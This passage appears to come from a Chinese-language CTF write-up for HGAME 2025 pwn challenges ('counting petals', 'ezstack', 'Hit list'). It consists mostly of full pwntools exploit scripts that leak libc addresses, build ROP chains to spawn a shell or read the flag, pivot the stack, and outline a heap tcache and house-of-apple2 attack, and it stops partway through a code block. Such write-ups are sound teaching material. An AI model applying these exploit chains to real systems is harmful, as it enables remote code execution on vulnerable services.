class="line">payload=b&#x27;a&#x27;*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>方法二</p><p>可以直接用栈溢出做，这里主要利用printf的gadget</p><p>我们需要做出合理的栈布局</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739964871396-afce93c2-37bd-4e32-b4b0-77ff33b4f3bf.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739965269125-67373558-814e-4da6-a546-2d7e917e7e5e.png" alt=""></p><p>可以泄露出libc地址，后续走system的rop链会卡栈，需要用ret2syscall打system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*  </span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=process(&#x27;./pwn&#x27;) </span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)   </span><br><span class="line">def li(a):</span><br><span class="line">    print(hex(a))     </span><br><span class="line">def r():</span><br><span class="line">    p.recv()</span><br><span class="line">def pr():</span><br><span class="line">    print(p.recv())</span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line">def get_32():</span><br><span class="line">    return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:])    </span><br><span class="line">def get_addr():</span><br><span class="line">    return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))    </span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;you have n chance to getshell&#x27;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">sl(b&#x27;%p&#x27;)</span><br><span class="line">rl(b&#x27;you type: &#x27;)</span><br><span class="line">stack=int(p.recv(14),16)+8480+16+0x10-8</span><br><span class="line">li(stack)</span><br><span class="line">rl(b&#x27; n = &#x27;)</span><br><span class="line"></span><br><span class="line">sl(b&#x27;-1&#x27;)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br><span class="line">bug()</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">libc_base=int(p.recv(14),16)-0x29e40</span><br><span class="line">li(libc_base)</span><br><span class="line"></span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x000000000011f2e7</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">system,bin=get_sb()</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0xc+p64(rdi)+p64(bin)+p64(rax)+p64(0x3b)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(syscall)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="counting-petals"><a href="#counting-petals" class="headerlink" title="counting petals"></a>counting petals</h4><p>数组越界，v7最后一个越界到v8，v9，我们可以任意越界写，后边打印也会外带出libc地址，并且不是偶数有两次机会，第一次利用数组越界泄露libc地址，第二次走rop链子</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888949445-d5360704-206f-42d7-b996-ce627203bcce.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,30656)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000015))</span><br><span class="line">for i in range(5):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">for i in range(18):</span><br><span class="line">rl(&quot; + &quot;)</span><br><span class="line"></span><br><span class="line">libc_base=int(p.recv(15),10)-171408</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot;\nHow many flowers have you prepared this time?&quot;)</span><br><span class="line">sl(str(16))</span><br><span class="line"></span><br><span class="line">rl(&quot;\nTell me the number of petals in each flower.&quot;)</span><br><span class="line">for i in range(14):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(i+1))</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(15))</span><br><span class="line"></span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">#bug()</span><br><span class="line">sl(str(0x0000001000000016))</span><br><span class="line">for i in range(2):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(b&#x27;-&#x27;)</span><br><span class="line"></span><br><span class="line">def pay(a):</span><br><span class="line">rl(&quot; : &quot;)</span><br><span class="line">sl(str(a))</span><br><span class="line">pay(rdi)</span><br><span class="line">pay(bin_sh)</span><br><span class="line">pay(rdi+1)</span><br><span class="line">pay(system)</span><br><span class="line"></span><br><span class="line">rl(&quot;Reply 1 indicates the former and 2 indicates the latter: &quot;)</span><br><span class="line">sl(str(1))</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="ezstack"><a href="#ezstack" class="headerlink" title="ezstack"></a>ezstack</h4><p>webpwn</p><p>主体就是一个栈迁移，有0x10字节溢出，并且开启沙盒</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889189440-8b981794-ea80-4176-a01d-dca3ff45e009.png" alt=""></p><p>这里给出gift，跟正常相比的就是fd位是4，最后orw的参数分别是0，5，4</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739889244487-ae479c2e-1268-4f62-a019-6f16b041373e.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31421)</span><br><span class="line">rdi=0x0000000000401713</span><br><span class="line">rsi_r15=0x0000000000401711</span><br><span class="line">bss=0x404154</span><br><span class="line">read=0x40140F</span><br><span class="line">leave_ret=0x401426</span><br><span class="line">rbp=0x000000000040135d</span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(bss)+p64(read)</span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line">sleep(0.01)</span><br><span class="line">pay2 =(p64(rsi_r15)+p64(elf.got[&#x27;read&#x27;])*2+p64(elf.plt[&#x27;write&#x27;])+p64(0x4013D2)).ljust(0x50,b&#x27;\x00&#x27;)</span><br><span class="line">pay2+=p64(0x404104-8)+p64(leave_ret)  </span><br><span class="line">#bug()</span><br><span class="line">s(pay2)</span><br><span class="line"></span><br><span class="line">libc_base=get_addr64()-libc.sym[&#x27;read&#x27;]</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+libc.search(asm(&quot;pop rdx\nret&quot;)).__next__()</span><br><span class="line">rdx_r12= libc_base+libc.search(asm(&quot;pop rdx\npop r12\nret&quot;)).__next__()</span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">ret = libc_base+libc.search(asm(&quot;ret&quot;)).__next__()</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">open=libc_base+libc.sym[&#x27;open&#x27;]</span><br><span class="line">read=libc_base + libc.sym[&#x27;read&#x27;]</span><br><span class="line">write=libc_base + libc.sym[&#x27;write&#x27;]</span><br><span class="line">mprotect=libc_base + libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rl(&quot;Good luck.\n&quot;)</span><br><span class="line">pay3=(p64(rsi)+p64(0x404530)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(0x4013D2)+b&#x27;/flag\x00\x00\x00&#x27;).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040dc-8)+p64(leave_ret)</span><br><span class="line">#bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line">flag=0x404530</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = b&#x27;/flag\x00\x00\x00&#x27;+p64(rdi) + p64(flag)  #/flag的字符串位置，要改</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(5)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(4)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*(0x50)+p64(0x404530)+p64(leave_ret)</span><br><span class="line"></span><br><span class="line">#bug()</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">sleep(0.1)</span><br><span class="line"></span><br><span class="line">pay3=(p64(rsi)+p64(bss)+p64(rdx_r12)+p64(0x100)*2+p64(rax)+p64(0)+p64(syscall)+p64(bss)).ljust(0x50,b&#x27;\x00&#x27;)+p64(0x4040d4-8)+p64(leave_ret)</span><br><span class="line">bug()</span><br><span class="line">s(pay3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag=0x40420c</span><br><span class="line">stack=0x404130+0x500</span><br><span class="line">orw = p64(rdi) + p64(flag)  #/flag的字符串位置，要改</span><br><span class="line">orw += p64(rsi) + p64(0)</span><br><span class="line">orw += p64(rax)+p64(2)+p64(syscall)</span><br><span class="line">orw += p64(rdi) + p64(3)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(1)</span><br><span class="line">orw += p64(rdx_r12) + p64(0x50)*2</span><br><span class="line">orw += p64(rsi)+p64(stack+0x200) #读入flag的位置</span><br><span class="line">orw += p64(write)+b&#x27;/flag\x00\x00\x00&#x27;</span><br><span class="line"></span><br><span class="line">sl(orw)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="Hit-list"><a href="#Hit-list" class="headerlink" title="Hit list"></a>Hit list</h4><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885361131-33186b5c-db0e-40ce-9e3c-267086d332f2.png" alt=""></p><p>add</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885486359-3b37c093-c360-4c0c-9ff7-7708bb2258df.png" alt=""></p><p>edit</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885533118-d0e39e18-15e9-4447-b26a-898efb9b5992.png" alt=""></p><p>gift</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739885409779-7bcccd44-5ef0-48f8-a84e-ad64ab8650b3.png" alt=""></p><p>典菜单堆题，漏洞点uaf</p><p>add限制堆块大小&lt;=0x3f0，这样就不能进行largerbin attack了，每次申请堆块会申请0x20的信息堆块</p><p>同时给出gift，可以任意地址free，触发条件是malloc(0)</p><p>edit是先将堆块free之后利用申请堆块的部分将堆块再次申请出来写入</p><p>首先就是泄露堆地址，申请两个共同大小的堆块，释放后申请0x20大小的堆块，就可以得到堆地址</p><p>其次是泄露libc地址，释放大于0x88的堆块，先将tcachebin添慢，中间0x30的堆块如果满的话没办法free，我们可以申请0x20的堆块再次释放，就可以拿到libc地址</p><p>最后我们申请一个大堆块，伪造好合适的size，利用gift将伪造的堆块释放，之后edit大堆块就可以完成tcachebin attack，攻击IO_list_all，写入我们伪造fake_io的堆地址，走house of apple2，exit退出触发getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 